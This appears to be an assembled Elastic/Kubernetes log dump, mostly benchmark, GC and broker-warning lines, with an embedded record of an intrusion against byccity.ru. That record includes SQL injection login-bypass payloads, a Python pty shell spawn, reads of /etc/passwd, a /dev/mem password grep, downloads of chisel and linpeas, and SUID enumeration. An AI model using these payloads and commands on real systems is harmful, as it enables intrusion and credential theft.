08:59:00.001, kubernetes.hints.container_logs, {"log.level":"error" "log.logger":"reader_json" "log.origin":{"file.name":"readjson/json.go" "file.line":75} "message":"Error decoding JSON: invalid character 'r' in literal false (expecting 'a')" "service.name":"filebeat" "ecs.version":"1.6.0"}
08:59:00.001, kubernetes.hints.containerlogs, failed to find message
08:59:00.001, kubernetes.hints.containerlogs, failed to find Loading workload...
08:59:00.001, kubernetes.hints.containerlogs, failed to find message
08:59:00.001, kubernetes.hints.containerlogs, [TOTALGCTIME%Copy] Time(%) 1.0822510822510822
08:59:00.001, kubernetes.hints.containerlogs, [TOTALGCSMarkSweepCompact] Count 0
08:59:00.001, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
08:59:00.001, kubernetes.hints.containerlogs, failed to find message
08:10:39.837, kubernetes.hints.container_logs, WARN [groupId=logs-kafka-loadgen] Connection to node -1 could not be established. Broker may not be available. (org.apache.kafka.clients.NetworkClient)
08:10:39.837, kubernetes.hints.container_logs, WARN [Consumer clientId=consumer-1 groupId=logs-kafka-loadgen] Connection to node -1 could not be established. Broker may not be available. (org.apache.kafka.clients.NetworkClient)
08:10:39.895, elastic_agent, [elastic_agent][info] Unit state changed beat/metrics-monitoring-metrics-monitoring-beats (CONFIGURING->HEALTHY): Healthy
08:59:00.001, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
08:59:00.001, app-search-analytics. failed to find message
08:59:00.001, -,  Elasticsearch exception [type=index_not_found_exception reason=no such index [ads]]
08:59:00.001, api, [][access]   "POST /api/as/v1/engines/movies/click HTTP/" 200 0
08:59:00.001, kubernetes.hints.container_logs, [WARN [Consumer clientId=consumer-1 groupId=metrics-kafka-loadgen] Connection to node -1 could not be established. Broker may not be available. (org.apache.kafka.clients.NetworkClient)
08:59:00.001, kubernetes.hints.container_logs, {"log.level":"error" "log.logger":"reader_json" "log.origin":{"file.name":"readjson/json.go" "file.line":75} "message":"Error decoding JSON: invalid character 'r' in literal false (expecting 'a')" "service.name":"filebeat" "ecs.version":"1.6.0"}
08:59:00.001, kubernetes.hints.containerlogs, failed to find message
08:59:00.001, kubernetes.hints.containerlogs, failed to find Loading workload...
08:59:00.001, kubernetes.hints.containerlogs, failed to find message
08:59:00.001, kubernetes.hints.containerlogs, [TOTALGCTIME%Copy] Time(%) 1.0822510822510822
08:59:00.001, kubernetes.hints.containerlogs, [TOTALGCSMarkSweepCompact] Count 0
08:59:00.001, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
08:59:00.001, kubernetes.hints.containerlogs, failed to find message
08:59:00.001, kubernetes.hints.container_logs, [UPDATE] Return=OK 1
08:59:00.001, kubernetes.hints.container_logs, 2024-05-29 07:42:33:875 1 sec: 10 operations; 7.17 current ops/sec; [CLEANUP: Count=2 Max=1292 Min=24  Avg=658 90=1292 99=1292 99.9=1292 99.99=1292] [INSERT: Count=10 Max=217343 Min=944 Avg=57071.5 90=217215 99=217343 99.9=217343 99.99=217343] 
08:59:00.001, kubernetes.hints.container_logs, [OVERALL] RunTime(ms) 1393
08:59:00.001, kubernetes.hints.container_logs, [OVERALL] Throughput(ops/sec) 7.178750897343862
08:59:00.001, kubernetes.hints.container_logsm, [TOTAL_GCS_Copy] Count, 8
08:59:00.001, sample_web_logs, 4.105.4.45 - - [2018-08-01T14:28:47.797Z] "GET /kibana/kibana-6.3.2-linux-x86_64.tar.gz HTTP/1.1" 200 2772 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:6.0a1) Gecko/20110421 Firefox/6.0a1"
08:59:00.001, sample_web_logs, 116.174.134.165 - - [2018-08-01T14:28:51.492Z] "GET /apm-server/apm-server-6.3.2-windows-x86.zip HTTP/1.1" 200 3334 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
08:59:00.001, sample_web_logs, 113.214.198.170 - - [2018-08-01T14:35:19.781Z] "GET /beats/metricbeat/metricbeat-6.3.2-i686.rpm HTTP/1.1" 200 8155 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
08:59:00.001, sample_web_logs, 3.98.45.188 - - [2018-08-01T14:35:39.713Z] "GET /styles/app.css HTTP/1.1" 200 5787 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
08:59:00.001, kubernetes.hints.containerlogs, failed to find Loading workload...
08:59:00.001, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
08:59:00.001, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
08:59:00.001, kubernetes.hints.containerlogs, failed to find message
08:59:00.001, sample_web_logs, 4.105.4.45 - - [2018-08-01T14:28:47.797Z] "GET /kibana/kibana-6.3.2-linux-x86_64.tar.gz HTTP/1.1" 200 2772 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:6.0a1) Gecko/20110421 Firefox/6.0a1"
08:59:00.001, sample_web_logs, 116.174.134.165 - - [2018-08-01T14:28:51.492Z] "GET /apm-server/apm-server-6.3.2-windows-x86.zip HTTP/1.1" 200 3334 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
08:59:00.001, sample_web_logs, 113.214.198.170 - - [2018-08-01T14:35:19.781Z] "GET /beats/metricbeat/metricbeat-6.3.2-i686.rpm HTTP/1.1" 200 8155 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
08:59:00.001, sample_web_logs, 3.98.45.188 - - [2018-08-01T14:35:39.713Z] "GET /styles/app.css HTTP/1.1" 200 5787 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML like Gecko) Chrome/11.0.696.50 Safari/534.24"
08:59:00.001, kubernetes.hints.containerlogs, failed to find Loading workload...
08:59:00.001, endpoint.events.network, Endpoint network event
08:59:00.001, kubernetes.hints.container_logs, WARN [Producer clientId=producer-1] Connection to node -1 could not be established. Broker may not be available. (org.apache.kafka.clients.NetworkClient)
08:59:00.001, kubernetes.hints.container_logs, 2024-05-28T23:44:00.583+0000 I STORAGE  [conn15695900] createCollection: ycsb.usertable with generated UUID: 1c5208cb-afab-4e4f-818e-a6844bb52ff3
08:59:00.001, kubernetes.hints.container_logs, 2024-05-28T23:44:00.672+0000 I NETWORK  [conn15695900] end connection 10.12.1.27:41832 (2 connections now open)
08:59:00.001, kubernetes.hints.containerlogs, failed to find Loading workload...
08:59:00.001, kubernetes.hints.containerlogs, OVERALL RunTime(ms) 1386
08:59:00.001, kubernetes.hints.containerlogs, [OVERALL] Throughput(ops/sec) 6.4935064935064934
08:59:00.001, kubernetes.hints.containerlogs, TOTAL_GCS_Copy Count 8
08:59:00.001, kubernetes.hints.containerlogs, [TOTALGCTIME%Copy] Time(%) 1.0822510822510822
08:59:00.001, kubernetes.hints.containerlogs, [TOTALGCSMarkSweepCompact] Count 0
08:59:00.001, kubernetes.hints.container_logs, WARN [Consumer clientId=consumer-1 groupId=logs-kafka-loadgen] Connection to node -1 could not be established. Broker may not be available. (org.apache.kafka.clients.NetworkClient)
08:59:00.001, kubernetes.hints.container_logs, WARN [Consumer clientId=consumer-1 groupId=logs-kafka-loadgen] Connection to node -1 could not be established. Broker may not be available. (org.apache.kafka.clients.NetworkClient)
08:59:00.001, elastic_agent, [elastic_agent][info] Unit state changed beat/metrics-monitoring-metrics-monitoring-beats (CONFIGURING->HEALTHY): Healthy
08:59:00.001, sample_web_logs, 4.105.4.45 - - [2018-08-01T14:28:47.797Z] "GET /kibana/kibana-6.3.2-linux-x86_64.tar.gz HTTP/1.1" 200 2772 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:6.0a1) Gecko/20110421 Firefox/6.0a1"
08:59:00.001, sample_web_logs, 116.174.134.165 - - [2018-08-01T14:28:51.492Z] "GET /apm-server/apm-server-6.3.2-windows-x86.zip HTTP/1.1" 200 3334 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
08:59:00.001, sample_web_logs, 113.214.198.170 - - [2018-08-01T14:35:19.781Z] "GET /beats/metricbeat/metricbeat-6.3.2-i686.rpm HTTP/1.1" 200 8155 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
08:59:00.001, sample_web_logs, 3.98.45.188 - - [2018-08-01T14:35:39.713Z] "GET /styles/app.css HTTP/1.1" 200 5787 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
08:59:00.001, kubernetes.hints.containerlogs, failed to find Loading workload...
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.container_logs, method [POST] host [https://byccity.ru:80]  URI [/application/auth/login/?user=admin&auth=admin' or 1 = 1'-- -] http.request.headers.User-Agent Mozilla/5.0 (Linux64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.90 Safari/537.36
09:57:34.399, api, [][access] "POST /api/as/v1/docs/application/auth/login/?user=admin' or 1 = 1'-- - HTTP/" 200 1491
09:57:34.399, kubernetes.hints.container_logs, I NETWORK  [listener] connection accepted from 127.0.0.1:80 #27531111 (1 connection now open)
09:57:34.399, endpoint.events.network, Endpoint network event
09:57:34.399, kubernetes.hints.container_logs, {os: {type: "Linux"; name: "PRETTY_NAME="Debian GNU/Linux 9""; architecture: "x86_64"; version: "Kernel 5.15.109+"}
09:57:34.399, kubernetes.hints.container_logs, Command line: cat /etc/passwd
09:57:34.399, kubernetes.hints.container_logs, Command line: strings /dev/mem -n10 | grep -i PASS
09:57:34.399, kubernetes.hints.container_logs, Command line: ls -alh /var/spool/cron;
09:57:34.399, kubernetes.hints.container_logs, Command line: wget github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_386.gz
09:57:34.399, kubernetes.hints.container_logs, Command line: wget github.com/peass-ng/PEASS-ng/releases/download/20240526-eac1a3fa/linpeas.sh
09:57:34.399, kubernetes.hints.container_logs, Command line: unzip chisel_1.9.1_linux_386.gz
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIMECopy] Time(ms) 15
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%Copy] Time(%) 1.0822510822510822
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCSMarkSweepCompact] Count 0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.397, kubernetes.hints.containerlogs, failed to find message
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%Copy] Time(%) 1.0822510822510822
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCSMarkSweepCompact] Count 0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.398, kubernetes.hints.containerlogs, failed to find message
09:57:34.399, kubernetes.hints.containerlogs, failed to find Loading workload...
09:57:34.399, kubernetes.hints.containerlogs, OVERALL RunTime(ms) 1386
09:57:34.399, kubernetes.hints.containerlogs, [OVERALL] Throughput(ops/sec) 6.4935064935064934
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GCS_Copy Count 8
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%Copy] Time(%) 1.0822510822510822
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCSMarkSweepCompact] Count 0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIMECopy] Time(ms) 15
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%Copy] Time(%) 1.0822510822510822
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCSMarkSweepCompact] Count 0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, api, [][access]   "POST /api/as/v1/engines/movies/search HTTP/" 200 544
09:57:34.399, endpoint.events.network, Endpoint network event
09:57:34.399, kubernetes.hints.container_logs, Error: Executing consumer group command failed due to The consumer group command timed out while waiting for group to initialize:
09:57:34.399, endpoint.events.network, Endpoint network event
09:57:34.399, kubernetes.hints.container_logs, mongo client connection created with mongodb://mongodb-service:27017/byccity?w=1&authSource=admin
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, api, [][access] "GET /api/as/v1/docs/application/auth/login/?user=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --&pass=pass1234 HTTP/" 200 1491
09:57:34.399, api, [][access] "GET /api/as/v1/docs/application/auth/login/?user=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --&pass=pass1234 HTTP/" 200 1491
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GCs Count 8
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME] Time(ms) 15
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME% Time(%) 1.0822510822510822
09:57:34.399, kubernetes.hints.containerlogs, [CLEANUP] Operations 2
09:57:34.399, kubernetes.hints.containerlogs, CLEANUP AverageLatency(us) 774.5
09:57:34.399, kubernetes.hints.container_logs, method [POST] host [https://byccity.ru:80]  URI [/application/auth/login/?user=admin&auth='1'='1'--] http.request.headers.User-Agent Mozilla/5.0 (Linux64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.90 Safari/537.36
09:57:34.399, api, [][access] "POST /api/as/v1/docs/application/auth/login/?user=admin&pass=admin') or '1'='1'-- HTTP/" 200 1491
09:57:34.399, api, [][access] "POST /api/as/v1/docs/application/auth/login/?user=admin&pass=admin') or '1'='1'-- HTTP/" 200 1491
09:57:34.399, api, [][access] "POST /api/as/v1/docs/application/auth/login/?user=admin&pass=admin') or '1'='1'-- HTTP/" 200 1491
09:57:34.399, api, [][access] "POST /api/as/v1/docs/application/auth/login/?user=admin&pass=admin') or '1'='1'-- HTTP/" 200 1491
09:57:34.399, api, [][access] "POST /api/as/v1/docs/application/auth/login/?user=admin&pass=admin') or '1'='1'-- HTTP/" 200 1491
09:57:34.399, api, [][access] "POST /api/as/v1/docs/application/auth/login/?user=admin&pass=admin') or '1'='1'-- HTTP/" 200 1491
09:57:34.399, api, [][access] "POST /api/as/v1/docs/application/auth/login/?user=admin&pass=admin') or '1'='1'-- HTTP/" 200 1491
09:57:34.399, kubernetes.hints.container_logs, I NETWORK  [listener] connection accepted from 127.0.0.1:80 #27531111 (1 connection now open)
09:57:34.399, endpoint.events.network, Endpoint network event
09:57:34.399, kubernetes.hints.container_logs, {os: {type: "Linux"; name: "PRETTY_NAME="Debian GNU/Linux 9""; architecture: "x86_64"; version: "Kernel 5.15.109+"}
09:57:34.399, kubernetes.hints.container_logs, Command line: python -c `import pty;pty.spawn(“/bin/bash”);`
09:57:34.399, kubernetes.hints.container_logs, Command line: cat /proc/version
09:57:34.399, kubernetes.hints.container_logs, Command line: uname -a
09:57:34.399, kubernetes.hints.container_logs, Command line: cat /etc/passwd
09:57:34.399, kubernetes.hints.container_logs, Command line: strings /dev/mem -n10 | grep -i PASS
09:57:34.399, kubernetes.hints.container_logs, Command line: ls -alh /var/spool/cron;
09:57:34.399, kubernetes.hints.container_logs, Command line: cd ../../../../tmp
09:57:34.399, kubernetes.hints.container_logs, Command line: wget github.com/peass-ng/PEASS-ng/releases/download/20240526-eac1a3fa/linpeas.sh
09:57:34.399, kubernetes.hints.container_logs, Command line: ./linpeas.sh
09:57:34.399, kubernetes.hints.container_logs, Command line: find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
09:57:34.399, kubernetes.hints.container_logs, Command line: find / -uid 0 -perm -4000 -type f 2>/dev/null
09:57:34.399, kubernetes.hints.container_logs, Command line: ldd /opt/binary
09:57:34.399, kubernetes.hints.container_logs, Command line: ip a
09:57:34.399, kubernetes.hints.container_logs, Command line: ls -la /etc/cron.d 
09:57:34.399, kubernetes.hints.container_logs, Command line: id
09:57:34.399, kubernetes.hints.container_logs, Command line: sudo -l
09:57:34.399, kubernetes.hints.container_logs, Command line: ./l1npeas.sh
09:57:34.399, kubernetes.hints.container_logs, Return=ERROR 3s
09:57:34.399, kubernetes.hints.container_logs, Client closed connection
09:57:34.399, kubernetes.hints.containerlogs, [CLEANUP] MinLatency(us) 5
09:57:34.399, kubernetes.hints.containerlogs, CLEANUP MaxLatency(us) 1544
09:57:34.399, kubernetes.hints.containerlogs, [CLEANUP] 95thPercentileLatency(us) 1544
09:57:34.399, kubernetes.hints.containerlogs, CLEANUP 99thPercentileLatency(us) 1544
09:57:34.399, kubernetes.hints.containerlogs, [SCAN] Operations 9
09:57:34.399, kubernetes.hints.containerlogs, SCAN AverageLatency(us) 51987.0
09:57:34.399, kubernetes.hints.containerlogs, [SCAN] MinLatency(us) 1154
09:57:34.399, kubernetes.hints.containerlogs, SCAN MaxLatency(us) 188927.
09:57:34.399, kubernetes.hints.container_logs, 2024-05-28T23:44:06.221+0000 I NETWORK  [listener] connection accepted from 10.12.3.129:37396 #15695910 (2 connections now open)
09:57:34.399, kubernetes.hints.container_logs, 2024-05-28T23:44:06.221+0000 I NETWORK  [listener] connection accepted from 10.12.3.129:37398 #15695911 (3 connections now open)
09:57:34.399, kubernetes.hints.container_logs, 2024-05-28T23:44:06.410+0000 I NETWORK  [conn15695910] end connection 10.12.3.129:37396 (2 connections now open)
09:57:34.399, kubernetes.hints.container_logs, 2024-05-28T23:44:06.410+0000 I NETWORK  [conn15695911] end connection 10.12.3.129:37398 (1 connection now open)
09:57:34.399, kubernetes.hints.container_logs, 2024-05-28T23:44:06.411+0000 I NETWORK  [conn15695909] end connection 10.12.3.129:37386 (0 connections now open)
09:57:34.399, app-search-analytics,verifying data integrity in the database.
09:57:34.399, app-search-analytics,retrieving latest updates from the databas
09:57:34.399, kubernetes.hints.containerlogs, failed to find message
09:57:34.399, kubernetes.hints.containerlogs, failed to find message
09:57:34.399, sample_web_logs, 4.105.4.45 - - [2018-08-01T14:28:47.797Z] "GET /kibana/kibana-6.3.2-linux-x86_64.tar.gz HTTP/1.1" 200 2772 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:6.0a1) Gecko/20110421 Firefox/6.0a1"
09:57:34.399, sample_web_logs, 116.174.134.165 - - [2018-08-01T14:28:51.492Z] "GET /apm-server/apm-server-6.3.2-windows-x86.zip HTTP/1.1" 200 3334 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
09:57:34.399, sample_web_logs, 113.214.198.170 - - [2018-08-01T14:35:19.781Z] "GET /beats/metricbeat/metricbeat-6.3.2-i686.rpm HTTP/1.1" 200 8155 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
09:57:34.399, sample_web_logs, 3.98.45.188 - - [2018-08-01T14:35:39.713Z] "GET /styles/app.css HTTP/1.1" 200 5787 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
09:57:34.399, kubernetes.hints.containerlogs, failed to find Loading workload...
09:57:34.399, kubernetes.hints.containerlogs, failed to find Loading workload...
09:57:34.399, kubernetes.hints.containerlogs, OVERALL RunTime(ms) 1386
09:57:34.399, kubernetes.hints.containerlogs, [OVERALL] Throughput(ops/sec) 6.4935064935064934
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GCS_Copy Count 8
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIMECopy] Time(ms) 15
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%Copy] Time(%) 1.0822510822510822
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCSMarkSweepCompact] Count 0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GCs Count 8
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME] Time(ms) 15
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%Copy] Time(%) 1.0822510822510822
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCSMarkSweepCompact] Count 0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.container_logs, method [GET] host [https://byccity.ru:80]  URI [/apply/_snils?ver=true&auth=true] http.request.headers.User-Agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.90 Safari/537.36
09:57:34.399, kubernetes.hints.container_logs, [][access] "GET /snils
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GCs Count 8
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GCs Count 8
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME] Time(ms) 15
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME% Time(%) 1.0822510822510822
09:57:34.399, kubernetes.hints.containerlogs, [CLEANUP] Operations 2
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME% Time(%) 1.0822510822510822
09:57:34.399, kubernetes.hints.containerlogs, [CLEANUP] Operations 2
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GCs Count 8
09:57:34.399, kubernetes.hints.containerlogs, [TOTALGCTIME] Time(ms) 15
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME% Time(%) 1.0822510822510822
09:57:34.399, kubernetes.hints.containerlogs, [CLEANUP] Operations 2
09:57:34.399, kubernetes.hints.containerlogs, TOTAL_GC_TIME% Time(%) 1.0822510822510822
